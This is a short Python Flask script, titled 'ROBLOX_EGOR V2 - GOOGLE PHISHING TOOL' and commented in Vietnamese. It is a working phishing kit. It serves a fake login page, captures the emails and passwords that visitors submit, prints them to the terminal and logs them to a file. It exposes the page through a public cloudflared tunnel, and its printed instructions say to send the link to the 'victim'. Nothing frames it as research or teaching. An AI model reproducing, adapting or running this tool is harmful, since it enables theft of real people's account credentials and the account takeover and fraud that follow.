from flask import Flask, request, render_template_string, jsonify
import subprocess
import threading
import re
import os

app = Flask(__name__)

# Đọc nội dung file index.html của ngài
with open('index.html', 'r', encoding='utf-8') as f:
    HTML_CONTENT = f.read()

@app.route('/')
def home():
    # Trả về chính file HTML của ngài
    return render_template_string(HTML_CONTENT)

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    email = data.get('email', '')
    password = data.get('password', '')
    
    # In ra terminal Termux (màu đỏ để nổi bật)
    print("\n" + "="*60)
    print(f"\033[91m[+] TÀI KHOẢN: {email}\033[0m")
    print(f"\033[91m[+] MẬT KHẨU: {password}\033[0m")
    print("="*60 + "\n")
    
    # Lưu vào file log để xem sau
    with open('log.txt', 'a', encoding='utf-8') as log:
        log.write(f"Email: {email} | Pass: {password}\n")
    
    return "OK", 200

# Hàm chạy cloudflared và lấy link công khai
def start_cloudflared():
    print("\n[+] Đang kết nối Cloudflared...")
    process = subprocess.Popen(
        ['cloudflared', 'tunnel', '--url', 'http://localhost:5000'],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )
    
    for line in process.stdout:
        if 'trycloudflare.com' in line:
            # Tìm link công khai
            match = re.search(r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com', line)
            if match:
                url = match.group(0)
                print("\n" + "="*60)
                print(f"\033[92m[🔗] LINK CÔNG KHAI: {url}\033[0m")
                print("="*60 + "\n")
                print("[*] Gửi link này cho nạn nhân.")
                print("[*] Chờ họ nhập tài khoản/mật khẩu.\n")
                break

if __name__ == '__main__':
    print("\n" + "="*60)
    print("  ROBLOX_EGOR V2 - GOOGLE PHISHING TOOL")
    print("="*60)
    
    # Chạy cloudflared trong luồng riêng
    threading.Thread(target=start_cloudflared, daemon=True).start()
    
    # Chạy server
    print("\n[*] Server đang chạy tại: http://localhost:5000")
    print("[*] Đang lấy link công khai...\n")
    app.run(host='0.0.0.0', port=5000, debug=False)
